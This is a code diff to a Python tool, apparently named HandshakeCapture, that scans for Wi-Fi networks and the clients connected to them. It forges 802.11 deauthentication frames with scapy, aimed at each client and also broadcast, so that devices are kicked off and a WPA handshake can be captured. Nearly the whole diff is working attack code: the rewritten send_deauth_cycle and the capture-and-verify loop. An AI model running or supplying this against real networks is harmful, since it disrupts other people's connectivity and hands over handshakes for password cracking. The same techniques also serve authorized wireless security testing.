@@ -153,23 +153,45 @@ class HandshakeCapture:
                             station_line = i
                             break
                     
-                    # Process only AP lines (not client lines)
+                    # Process AP lines and their clients
                     ap_lines = lines[1:station_line] if station_line != -1 else lines[1:]
+                    client_lines = lines[station_line+1:] if station_line != -1 else []
                     
+                    # First, collect all networks
                     for line in ap_lines:
                         if line.strip() and ',' in line:
                             parts = line.strip().split(',')
                             if len(parts) >= 14:  # Ensure we have enough fields
                                 essid = parts[13].strip()
-                                # Only add networks with a valid ESSID
-                                if essid and essid != "":
+                                bssid = parts[0].strip()
+                                # Only add networks with a valid BSSID
+                                if bssid and ':' in bssid:
                                     networks.append({
-                                        'BSSID': parts[0].strip(),
+                                        'BSSID': bssid,
                                         'Channel': parts[3].strip(),
-                                        'ESSID': essid
+                                        'ESSID': essid or "<hidden>",
+                                        'Clients': []
                                     })
-                                    # Print immediate feedback
-                                    self.console.print(f"[green]Found network:[/green] {essid} ({parts[0].strip()})")
+                    
+                    # Then, add clients to their networks
+                    for line in client_lines:
+                        if line.strip() and ',' in line:
+                            parts = line.strip().split(',')
+                            if len(parts) >= 6:
+                                client_mac = parts[0].strip()
+                                ap_mac = parts[5].strip()
+                                for network in networks:
+                                    if network['BSSID'] == ap_mac:
+                                        network['Clients'].append(client_mac)
+                                        
+                    # Print feedback
+                    for network in networks:
+                        client_count = len(network['Clients'])
+                        self.console.print(
+                            f"[green]Found network:[/green] {network['ESSID']} ({network['BSSID']}) "
+                            f"[cyan]Clients:[/cyan] {client_count}"
+                        )
+                        
             except FileNotFoundError:
                 self.console.print("[red]Error: Scan output file not found.[/red]")
             finally:
@@ -444,59 +466,47 @@ class HandshakeCapture:
 
     def send_deauth_cycle(self, clients):
         """Send deauth packets with improved efficiency and targeting"""
-        end_time = time.time() + 5  # Reduced to 5 seconds for quicker cycles
-
-        with Progress() as progress:
-            task = progress.add_task("[red]Sending deauth packets...", total=5)
+        try:
+            self.console.print(f"[yellow]Sending deauth packets to {len(clients)} clients...[/yellow]")
             
-            while time.time() < end_time and self.running and not self.handshake_captured:
-                if clients:
-                    for client in clients:
-                        # Send deauth from AP to client
-                        deauth_pkt1 = RadioTap() / Dot11(
-                            type=0,
-                            subtype=12,
-                            addr1=client,
-                            addr2=self.target_bssid,
-                            addr3=self.target_bssid
-                        ) / Dot11Deauth(reason=7)
-                        
-                        # Send deauth from client to AP
-                        deauth_pkt2 = RadioTap() / Dot11(
-                            type=0,
-                            subtype=12,
-                            addr1=self.target_bssid,
-                            addr2=client,
-                            addr3=self.target_bssid
-                        ) / Dot11Deauth(reason=7)
-                        
-                        # Send packets in bursts
-                        for _ in range(2):  # Reduced number of packets
-                            sendp(deauth_pkt1, iface=self.interface, verbose=False)
-                            sendp(deauth_pkt2, iface=self.interface, verbose=False)
-                            time.sleep(0.1)  # Small delay between bursts
-                        
-                        # Quick check for handshake after each client
-                        if os.path.exists(f"{self.capture_file}-01.cap"):
-                            if self.verify_handshake():
-                                self.handshake_captured = True
-                                return
-                else:
-                    # More targeted broadcast approach
-                    deauth_pkt = RadioTap() / Dot11(
-                        type=0,
-                        subtype=12,
-                        addr1="FF:FF:FF:FF:FF:FF",
-                        addr2=self.target_bssid,
-                        addr3=self.target_bssid
-                    ) / Dot11Deauth(reason=7)
-                    
-                    for _ in range(3):  # Reduced broadcast packets
-                        sendp(deauth_pkt, iface=self.interface, verbose=False)
-                        time.sleep(0.1)
+            # Create and send deauth packets
+            for client in clients:
+                # From AP to client
+                deauth1 = RadioTap() / Dot11(
+                    type=0,
+                    subtype=12,
+                    addr1=client,
+                    addr2=self.target_bssid,
+                    addr3=self.target_bssid
+                ) / Dot11Deauth(reason=7)
                 
-                progress.update(task, advance=1)
-                time.sleep(1)
+                # From client to AP
+                deauth2 = RadioTap() / Dot11(
+                    type=0,
+                    subtype=12,
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid
+                ) / Dot11Deauth(reason=7)
+                
+                # Send packets in bursts
+                for _ in range(3):
+                    sendp(deauth1, iface=self.interface, count=3, inter=0.1, verbose=False)
+                    sendp(deauth2, iface=self.interface, count=3, inter=0.1, verbose=False)
+            
+            # Also send broadcast deauth
+            broadcast_deauth = RadioTap() / Dot11(
+                type=0,
+                subtype=12,
+                addr1="ff:ff:ff:ff:ff:ff",
+                addr2=self.target_bssid,
+                addr3=self.target_bssid
+            ) / Dot11Deauth(reason=7)
+            
+            sendp(broadcast_deauth, iface=self.interface, count=5, inter=0.1, verbose=False)
+            
+        except Exception as e:
+            self.console.print(f"[red]Error sending deauth packets: {str(e)}[/red]")
 
     def listen_cycle(self):
         """Listen for handshakes with improved client monitoring"""
@@ -582,7 +592,7 @@ class HandshakeCapture:
         # Setup monitor mode
         mon_interface = self.setup_monitor_mode()
         if not mon_interface:
-            self.console.print("[red]Failed to setup monitor mode. Make sure your wireless adapter supports monitor mode.[/red]")
+            self.console.print("[red]Failed to setup monitor mode.[/red]")
             return
 
         self.interface = mon_interface
@@ -593,7 +603,7 @@ class HandshakeCapture:
             self.console.print("[red]No networks found![/red]")
             return
 
-        # Display and select target network
+        # Display networks with client count
         self.console.print("\n[green]Networks found:[/green]")
         table = Table(show_header=True, header_style="bold magenta")
         table.add_column("#", style="dim")
@@ -603,13 +613,12 @@ class HandshakeCapture:
         table.add_column("Clients", justify="center")
         
         for idx, network in enumerate(networks, 1):
-            client_count = len([c for c in network.get('Clients', [])])
             table.add_row(
                 str(idx),
                 network['BSSID'],
                 network['Channel'],
                 network['ESSID'],
-                str(client_count)
+                str(len(network['Clients']))
             )
         
         self.console.print(table)
@@ -660,25 +669,31 @@ class HandshakeCapture:
             max_cycles = 10  # Limit the number of cycles
             
             while self.running and not self.handshake_captured and cycle_count <= max_cycles:
+                self.console.print(f"\n[cyan]Cycle {cycle_count}/{max_cycles}[/cyan]")
+                
                 # Get current clients
                 clients = self.get_connected_clients()
                 
-                self.console.print(f"\n[cyan]Cycle {cycle_count}/{max_cycles}[/cyan]")
                 if clients:
                     self.console.print(f"[green]Found {len(clients)} connected clients[/green]")
-                    # Deauth phase
+                    
+                    # Send deauth packets
                     self.send_deauth_cycle(clients)
+                    
+                    # Wait for clients to reconnect and capture handshake
+                    self.console.print("[yellow]Waiting for handshake...[/yellow]")
+                    for _ in range(15):  # Check for 15 seconds
+                        if os.path.exists(f"{self.capture_file}-01.cap"):
+                            if self.verify_handshake():
+                                self.handshake_captured = True
+                                break
+                        time.sleep(1)
                     
                     if self.handshake_captured:
                         break
-                    
-                    # Listen phase
-                    if self.listen_cycle():
-                        break
                 else:
-                    self.console.print("[yellow]Waiting for clients to connect...[/yellow]")
-                    time.sleep(5)
-                    continue
+                    self.console.print("[yellow]No clients currently connected, waiting...[/yellow]")
+                    time.sleep(5)  # Wait before next check
                 
                 cycle_count += 1
                 if cycle_count > max_cycles:
